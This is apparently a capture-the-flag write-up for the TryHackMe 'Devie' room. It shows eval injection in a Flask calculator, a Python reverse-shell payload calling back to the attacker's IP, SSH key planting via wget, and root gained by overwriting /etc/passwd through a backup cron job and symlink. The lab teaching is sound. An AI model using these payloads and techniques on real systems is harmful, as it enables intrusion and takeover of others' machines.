<p align="center">
  THM : Devie<br>
  Difficulty : Medium<br>
  Room link : https://tryhackme.com/room/devie<br>
  <img src="https://i.imgur.com/lPCioj3.jpg">
</p>

## Summary

- [Nmap scan](#nmap-scan)
- [Web enumeration](#web-enumeration)
- [Eval function exploitation](#eval-function-exploitation)
- [Linux enumeration](#linux-enumeration)
- [Privilege escalation (gordon)](#privilege-escalation-gordon)
- [Privilege escalation (root)](#privilege-escalation-root)
- [Conclusion](#conclusion)

## Nmap scan

Let's run an agressive [nmap](https://nmap.org/book/man.html) scan against the target :  
```
attacker@AttackBox:~/Devie$ nmap 10.10.190.159 -A -p- -oN nmapResults.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2023-04-09 18:42 CEST
Nmap scan report for 10.10.190.159
Host is up (0.076s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date: Sun, 09 Apr 2023 16:43:02 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 4486
|     Connection: close
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
|     <title>Math</title>
|     </head>
|     <body>
|     id="title">Math Formulas</p>
|     <main>
|     <section> <!-- Sections within the main -->
|     id="titles"> Feel free to use any of the calculators below:</h3>
|     <br>
|     <article> <!-- Sections within the section -->
|     id="titles">Quadratic formula</h4> 
|     <form met
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.80%I=7%D=4/9%Time=6432EB17%P=x86_64-pc-linux-gnu%r(Get
SF:Request,1235,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.1\.2\x20
SF:Python/3\.8\.10\r\nDate:\x20Sun,\x2009\x20Apr\x202023\x2016:43:02\x20GM
SF:T\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2
SF:04486\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<html\x20lang=
SF:\"en\">\n\x20\x20<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\
SF:x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-wid
SF:th,\x20initial-scale=1\">\n\n\x20\x20\x20\x20<link\x20href=\"https://cd
SF:n\.jsdelivr\.net/npm/bootstrap@5\.0\.1/dist/css/bootstrap\.min\.css\"\x
SF:20rel=\"stylesheet\"\x20integrity=\"sha384-\+0n0xVW2eSR5OomGNYDnhzAbDsO
SF:XxcvSN1TPprVMTNDbiYZCxYbOOl7\+AMvyTG2x\"\x20crossorigin=\"anonymous\">\
SF:n\n\x20\x20\x20\x20<title>Math</title>\n\x20\x20</head>\n\x20\x20<body>
SF:\n\x20\x20\x20\x20<p\x20id=\"title\">Math\x20Formulas</p>\n\n\x20\x20\x
SF:20\x20<main>\n\x20\x20\x20\x20\x20\x20<section>\x20\x20<!--\x20Sections
SF:\x20within\x20the\x20main\x20-->\n\n\t\t\t\t<h3\x20id=\"titles\">\x20Fe
SF:el\x20free\x20to\x20use\x20any\x20of\x20the\x20calculators\x20below:</h
SF:3>\n\x20\x20\x20\x20\x20\x20\x20\x20<br>\n\t\t\t\t<article>\x20<!--\x20
SF:Sections\x20within\x20the\x20section\x20-->\n\t\t\t\t\t\n\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20<h4\x20id=\"titles\">Quadratic\x20formula</h4
SF:>\x20\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20<form\x20met")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTML\x
SF:20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\
SF:x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=
SF:\"Content-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</
SF:head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Erro
SF:r\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x
SF:20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20reques
SF:t\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad
SF:\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x2
SF:0\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 139.11 seconds
```

So there is a web server running on port 5000. It is developped in Python3 and maybe using the Flask module.

## Web enumeration

Let's take a look at the website using a web browser :  
![](https://i.imgur.com/KnUOiGD.jpg)  

Here, I tried to put letters in each fiels one by one to see if something happen... And when I tried with `xa` in `Bisection Method`, I had and internal server error (code 500) :  
![](https://i.imgur.com/D0TS3aM.jpg)  

If you look at the bottom of the page, you can notice a link to download the source code of the page. Let's take a look at it :  
```
attacker@AttackBox:~/Devie$ unzip source.zip 
Archive:  source.zip
   creating: math/
  inflating: math/quadratic.py       
   creating: math/templates/
  inflating: math/templates/index.html  
  inflating: math/app.py             
  inflating: math/bisection.py       
  inflating: math/prime.py           
attacker@AttackBox:~/Devie$ cd math/
attacker@AttackBox:~/Devie/math$ ls
app.py  bisection.py  prime.py  quadratic.py  templates
```


 Let's see what's in `app.py` :  
```
attacker@AttackBox:~/Devie/math$ cat app.py 
from quadratic import InputForm1
from prime import InputForm2
from bisection import InputForm3
from flask import Flask, request, render_template
import math

app = Flask(__name__)

@app.route('/', methods=['GET','POST']) #Applies to get GET when we load the site and POST
def index():
    form1 = InputForm1(request.form) #Calling the class from the model.py. This is where the GET comes from
    form2 = InputForm2(request.form)
    form3 = InputForm3(request.form)
    if request.method == 'POST' and form1.validate(): 
        result1, result2 = compute(form1.a.data, form1.b.data,form1.c.data) #Calling the variables from the form
        pn = None
        root = None
    elif request.method == 'POST' and form2.validate(): 
        pn = primef(form2.number.data)
        result1 = None
        result2 = None
        root = None
    elif request.method == 'POST' and form3.validate():
        root = bisect(form3.xa.data, form3.xb.data)
        pn = None
        result1 = None
        result2 = None
    else:
        result1 = None #Otherwise is none so no display
        result2 = None
        pn = None
        root = None
    return render_template('index.html',form1=form1, form2=form2, form3=form3, result1=result1, result2=result2,pn = pn, root=root) #Display the page

@app.route("/")
def compute(a,b,c):
    disc = b*b - 4*a*c
    n_format = "{0:.2f}" #Format to 2 decimal spaces
    if disc > 0:
        result1 = (-b + math.sqrt(disc)) / 2*a
        result2 = (-b - math.sqrt(disc)) / 2*a
        result1 = float(n_format.format(result1))
        result2 = float(n_format.format(result2))
    elif disc == 0:
        result1 = (-b + math.sqrt(disc)) / 2*a
        result2 = None
        result1 = float(n_format.format(result1))
    else:
        result1 = "" #Empty string for the purpose of no real roots
        result2 = ""
    return result1, result2

@app.route("/")
def primef(n):
    pc = 0
    n = int(n)
    for i in range(2,n): #From 2 up to the number
        p = n % i #Get the remainder
        if p == 0: #If it equals 0
            pc = 1 #Then its not prime and break the loop
            break
    if pc == 1:
        pn = 1
        return pn
    elif pc == 0:
        pn = 0
        return pn

@app.route("/")
def bisect(xa,xb):
    added = xa + " + " + xb
    c = eval(added)
    c = int(c)/2
    ya = (int(xa)**6) - int(xa) - 1 #f(a)
    yb = (int(xb)**6) - int(xb) - 1 #f(b)
    
    if ya > 0 and yb > 0: #If they are both positive, since we are checking for one root between the points, not two. Then if both positive, no root
        root = 0
        return root
    else:
        e = 0.0001 #When to stop checking, number is really small

        l = 0 #Loop
        while l < 1: #Endless loop until condition is met
            d = int(xb) - c #Variable d to check for e
            if d <= e: #If d < e then we break the loop
                l = l + 1
            else:
                yc = (c**6) - c - 1 #f(c)
                if yc > 0: #If f(c) is positive then we switch the b variable with c and get the new c variable
                    xb = c
                    c = (int(xa) + int(xb))/2
                elif yc < 0: #If (c) is negative then we switch the a variable instead
                    xa = c 
                    c = (int(xa) + int(xb))/2
        c_format = "{0:.4f}"
        root = float(c_format.format(c))
        return root
    
if __name__=="__main__":
    app.run("0.0.0.0",5000)
```

So there is a function defined for the `bisection method`, let's take a look at this function to see how it works :  
```
def bisect(xa,xb):
    added = xa + " + " + xb
    c = eval(added)
    c = int(c)/2
    ya = (int(xa)**6) - int(xa) - 1 #f(a)
    yb = (int(xb)**6) - int(xb) - 1 #f(b)
    ...
    ...
    ...
```

The `eval` function is called with the two values entered by the user. The `eval` function can execute the string passed in argument as python code. Since there isn't any filters 
or input validations, we can literrally run any python code by writing it in `xa` or `xb` inputs on the web page.

## Eval function exploitation

I tried to simply use a python3 reverse shell but it didn't work. We have to use a little different payload for this. First, let's start a netcat listener :  
```
attacker@AttackBox:~/Devie/math$ nc -lnvp 4242
listening on [any] 4242 ...
```

Now, I will use this payload :  
```
__import__("subprocess").getoutput("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.14.32.60\",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'")
```

Let's put it in the `xa` field like this :  
![](https://i.imgur.com/s202DY9.jpg)  

Now we can press the `Submit` button at the bottom of the page and see if we receive a reverse shell :  
```
attacker@AttackBox:~/Devie/math$ nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.14.32.60] from (UNKNOWN) [10.10.190.159] 34150
$ whoami
whoami
bruce
$
```

And we have a reverse shell as `bruce` !

## Linux enumeration

First, let's get a better shell. We can write our own SSH public key in `/home/bruce/.ssh` to connect using SSH. First, let's generate a pair of SSH keys :  
```
attacker@AttackBox:~/Devie/math$ ssh-keygen -f id_rsa
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in id_rsa
Your public key has been saved in id_rsa.pub
The key fingerprint is:
SHA256:d/cGgbt6GViHj+KQo0FlqcV1ZTnW87WBmCqfoDZhGPs attacker@AttackBox
The key's randomart image is:
+---[RSA 3072]----+
|       . o. +.+o |
|   .    *  + ++oo|
|    +  =  . .o..*|
|   o ooo .  o..o.|
|    o.o S.ooo+o  |
|     E. ++o.oo.o |
|    . .o + ..o  o|
|      .   ..o  . |
|          ..     |
+----[SHA256]-----+
```

Now let's rename the file `id_rsa.pub` to `authorized_keys` and run a temporary web server using python3 :  
```
attacker@AttackBox:~/Devie/math$ mv id_rsa.pub authorized_keys
attacker@AttackBox:~/Devie/math$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Now, we can remove the old file on the target and download our own public key :  
```
$ cd /home/bruce/.ssh
cd /home/bruce/.ssh
$ rm authorized_keys
rm authorized_keys
$ wget http://10.14.32.60:8080/authorized_keys
wget http://10.14.32.60:8080/authorized_keys
--2023-04-09 17:15:12--  http://10.14.32.60:8080/authorized_keys
Connecting to 10.14.32.60:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 572 [application/octet-stream]
Saving to: ‘authorized_keys’

authorized_keys     100%[===================>]     572  --.-KB/s    in 0s      

2023-04-09 17:15:12 (51.8 MB/s) - ‘authorized_keys’ saved [572/572]

$ ls
ls
authorized_keys
```

Let's try to login using SSH with our private key now :  
```
attacker@AttackBox:~/Devie/math$ ssh bruce@10.10.190.159 -i id_rsa 
The authenticity of host '10.10.190.159 (10.10.190.159)' can't be established.
ECDSA key fingerprint is SHA256:FMyk7V39bj2x9ByJrEpNsiS8tLASQcdDe7PG0RSoN2M.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.190.159' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 09 Apr 2023 05:16:09 PM UTC

  System load:  0.0               Processes:             124
  Usage of /:   56.4% of 8.87GB   Users logged in:       0
  Memory usage: 12%               IPv4 address for ens5: 10.10.190.159
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu May 12 16:21:57 2022 from 10.0.2.26
bruce@devie:~$
```

We can take the first flag here :  
```
bruce@devie:~$ ls
checklist  flag1.txt  note
bruce@devie:~$ cat flag1.txt 
THM{**************}
```

We can see a file named `note`, let's take a look at it :  
```
bruce@devie:~$ cat note
Hello Bruce,

I have encoded my password using the super secure XOR format.

I made the key quite lengthy and spiced it up with some base64 at the end to make it even more secure. I'll share the decoding script for it soon. However, you can use my script located in the /opt/ directory.

For now look at this super secure string:
NEUEDTIeN1MRDg5K

Gordon
```

We have an encoded string. Maybe it's the password for `gordon`. We know it's encoded using base64 and xor encoding. We also have the encoding script in `/opt/`. Let's take a look at our sudo rights first :  
```
bruce@devie:~$ sudo -l
Matching Defaults entries for bruce on devie:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bruce may run the following commands on devie:
    (gordon) NOPASSWD: /usr/bin/python3 /opt/encrypt.py
```

## Privilege escalation (gordon)

We can run the encoding script. So we may be able to find out the xor key without reading the source code (we don't have the read permission on the file). Let's run this script :  
```
bruce@devie:~$ sudo -u gordon /usr/bin/python3 /opt/encrypt.py
Enter a password to encrypt: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
EhQRBBMSBAITBBUKBBgZDhMZDhMSFBEEExIEAhMEFQoEGBkOExkOExIUEQ==
```

So I have encoded `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa` and the encoded string is `EhQRBBMSBAITBBUKBBgZDhMZDhMSFBEEExIEAhMEFQoEGBkOExkOExIUEQ==`.  
Let's use CyberChef to find out the XOR key :  
![](https://i.imgur.com/7MDyJjK.jpg)  

Now we have the xor key ! Let's decode the encoded password for user `gordon` :  
![](https://i.imgur.com/JIpzZim.jpg)  

Now we can loggin as `gordon` :  
```
bruce@devie:~$ su gordon
Password: 
gordon@devie:/home/bruce$
```

We can get the second flag in `/home/gordon/flag2.txt` :  
```
gordon@devie:/home/bruce$ cd
gordon@devie:~$ ls
backups  flag2.txt  reports
gordon@devie:~$ cat flag2.txt 
THM{**************}
```

## Privilege escalation (root)

There is a `backups` directory in our home directory. Let's see what's inside :  
```
gordon@devie:~/backups$ ls
report1  report2  report3
gordon@devie:~/backups$
```

There is 3 files. Their content is useless. There is also a `reports` directory in our home directory :  
```
gordon@devie:~/reports$ ls
report1  report2  report3
```

There is the same files in the two directories. Maybe there is a backup script that run every time on the system ? We can find this out by using `pspy64` (I downloaded it to the target from a python web server on my virtual machine) :  
```
gordon@devie:~/reports$ cd /tmp
gordon@devie:/tmp$ wget http://10.14.32.60:8080/pspy64
--2023-04-09 17:32:19--  http://10.14.32.60:8080/pspy64
Connecting to 10.14.32.60:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                        100%[================================================>]   2.94M  2.22MB/s    in 1.3s    

2023-04-09 17:32:20 (2.22 MB/s) - ‘pspy64’ saved [3078592/3078592]

gordon@devie:/tmp$ chmod +x pspy64 
gordon@devie:/tmp$ ./pspy64 
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2023/04/09 17:32:32 CMD: UID=0    PID=956    | 
2023/04/09 17:32:32 CMD: UID=0    PID=94     | 
2023/04/09 17:32:32 CMD: UID=0    PID=93     | 
...
...
2023/04/09 17:34:01 CMD: UID=0    PID=1668   | /usr/sbin/CRON -f 
2023/04/09 17:34:01 CMD: UID=0    PID=1670   | /usr/bin/bash /usr/bin/backup 
2023/04/09 17:34:01 CMD: UID=0    PID=1669   | /bin/sh -c /usr/bin/bash /usr/bin/backup 
```

There is a backup script running every minutes located in `/usr/bin/backup`. Let's take a look at it :  
```
gordon@devie:/tmp$ file /usr/bin/backup 
/usr/bin/backup: Bourne-Again shell script, ASCII text executable
gordon@devie:/tmp$ cat /usr/bin/backup 
#!/bin/bash

cd /home/gordon/reports/

cp * /home/gordon/backups/
```

It just copies all files in `/home/gordon/reports` to `/home/gordon/backups`. We can escalate our privileges from this. To do so, we have to create a custom passwd file. Let's copy the original one first in `/home/gordon/reports` :  
```
gordon@devie:~$ cd reports/
gordon@devie:~/reports$ cp /etc/passwd ./
gordon@devie:~/reports$ ls
passwd  report1  report2  report3
```

Now let's generate a password hash on our attacking machine :  
```
attacker@AttackBox:~$ mkpasswd --method=SHA-256 --stdin
Mot de passe : root
$5$W8ZiasBBqkkOB7au$Db7uEYcWuCXdaxoeYSKZ8Uf9408hwMi2dvjEVQuIRGC
```

Let's copy this hash and paste it in `/home/gordon/reports/passwd` like so :  
```
gordon@devie:~/reports$ nano passwd 
gordon@devie:~/reports$ head passwd 
root:$5$W8ZiasBBqkkOB7au$Db7uEYcWuCXdaxoeYSKZ8Uf9408hwMi2dvjEVQuIRGC:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
```

Now, lets remove the `backups` directory :  
```
gordon@devie:~/reports$ cd ..
gordon@devie:~$ ls
backups  flag2.txt  reports
gordon@devie:~$ rm backups/ -dfr
gordon@devie:~$ ls
flag2.txt  reports
```

Now, we can create a symbolic link named `backups` that points to `/etc`, by doing so, the `passwd` file we created will be copied in `/etc` :  
```
gordon@devie:~$ ln /etc -s backups
gordon@devie:~$ ls
backups  flag2.txt  reports
```

Now let's wait at least one minute for the backup script to run and see if it worked :  
```
gordon@devie:~$ head /etc/passwd
root:$5$W8ZiasBBqkkOB7au$Db7uEYcWuCXdaxoeYSKZ8Uf9408hwMi2dvjEVQuIRGC:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
```

Now let's try to login as `root` using the password we used to generate the hash for the passwd file (in my case the password is root):  
```
gordon@devie:~$ su root
Password: 
root@devie:/home/gordon#
```

Now we are root ! Let's get the root flag :  
```
root@devie:/home/gordon# cd /root
root@devie:~# ls
root.txt  snap
root@devie:~# cat root.txt
THM{***************}
root@devie:~#
```

## Conclusion

In this room, we practiced :  
- Services and port enumeration using [nmap](https://nmap.org/book/man.html)
- Python code injection using eval function in a Flask webserver
- Linux enumeration
- Decoding and getting a XOR key for encoded string
- Privilege escalation using backup script and symbolic link

Thanks for this room and thanks for reading my write ups !




